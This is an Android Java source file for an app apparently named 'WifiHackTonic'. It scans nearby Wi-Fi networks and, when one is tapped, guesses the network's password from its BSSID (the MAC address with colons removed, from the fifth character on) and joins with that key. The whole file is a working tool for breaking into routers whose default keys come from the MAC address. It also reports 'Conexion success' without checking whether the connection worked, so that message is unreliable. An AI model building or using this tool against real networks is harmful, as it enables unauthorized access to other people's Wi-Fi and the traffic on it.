package com.example.wifihacktonic.wifihacktonic;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    private WifiManager wifiManager;
    private ListView listView;
    private TextView tv2;
    private Button buttonScan;
    private int size=0;
    private List <ScanResult> results;
    private ArrayList <String> arrayList = new ArrayList<>();
    private ArrayList <String> mac = new ArrayList<>();
    private ArrayAdapter adapter;
    private String macAddress = "";
    private String pass = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        buttonScan= findViewById(R.id.scanBtn);
        buttonScan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                scanwifi();
            }
        });

        listView = (ListView) findViewById(R.id.wifilist);
        tv2 = (TextView) findViewById(R.id.tv2);

        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        if (!wifiManager.isWifiEnabled())
        {
            Toast.makeText(this, "Wifi is disabled ... You need to enable it", Toast.LENGTH_LONG).show();
            wifiManager.setWifiEnabled(true);
        }

        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,arrayList);
        listView.setAdapter(adapter);

        listView.setOnItemClickListener
        ((parent, view, position, id) ->
        {
               //tv2.setText("La MAC Address de la red " + listView.getItemAtPosition(position) + "es: " + mac.get(position));
               Toast.makeText(this, "Trying to Connect it ...",Toast.LENGTH_SHORT).show();
               macAddress = mac.get(position).toString();
               macAddress = macAddress.replace(":", "");
               pass = macAddress.substring(4);
               //tv2.setText("La MAC Address de " + listView.getItemAtPosition(position) + " es: " + mac.get(position) + "\n Pass es: " + pass);
               connectToWifi(listView.getItemAtPosition(position).toString(), pass.toString());

        });
        scanwifi();
    }

    private void scanwifi ()
    {
        arrayList.clear();
        registerReceiver(wifiReceiver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        wifiManager.startScan();
        Toast.makeText(this, "Scaning Wifi ...",Toast.LENGTH_SHORT).show();
    }

    BroadcastReceiver wifiReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            results = wifiManager.getScanResults();
            unregisterReceiver(this);

            for (ScanResult scanResult : results)
            {
                arrayList.add(scanResult.SSID);
                mac.add(scanResult.BSSID);
                adapter.notifyDataSetChanged();
            }
        }
    };

    private void connectToWifi(final String SSID, final String pass)
    {
        if (!wifiManager.isWifiEnabled())
        {
            wifiManager.setWifiEnabled(true);
        }

        WifiConfiguration conf = new WifiConfiguration();
        conf.SSID = String.format("\"%s\"", SSID);
        conf.preSharedKey = String.format("\"%s\"",pass);

        int netId = wifiManager.addNetwork(conf);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId,true);
        wifiManager.reconnect();
        Toast.makeText(this, "Conexion success ...",Toast.LENGTH_SHORT).show();
    }

}
